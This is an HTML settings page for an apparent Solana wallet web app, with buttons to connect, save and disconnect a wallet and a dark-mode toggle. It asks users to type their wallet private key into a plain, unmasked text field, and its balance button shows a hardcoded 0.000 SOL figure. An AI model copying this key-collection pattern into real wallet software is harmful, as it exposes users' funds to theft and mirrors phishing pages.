<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Settings</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>

    <div class="container">
        <h2>⚙️ Settings</h2>
        <button class="button" onclick="connectWallet()">🔑 Connect Wallet</button>
        <input type="text" id="walletInput" placeholder="Enter private key">
        <button class="button" id="saveWallet" onclick="saveWallet()" style="display:none;">Save Wallet</button>
        <button class="button" onclick="alert('Your balance: 0.000 SOL')">💰 View Balance</button>
        <button class="button" onclick="disconnectWallet()">🔌 Disconnect Wallet</button>
        <button class="button" onclick="toggleDarkMode()">🌙 Toggle Dark Mode</button>
    </div>

    <button class="back-btn" onclick="location.href='index.html'">🔙 Back</button>

    <script src="script.js"></script>
</body>
</html>
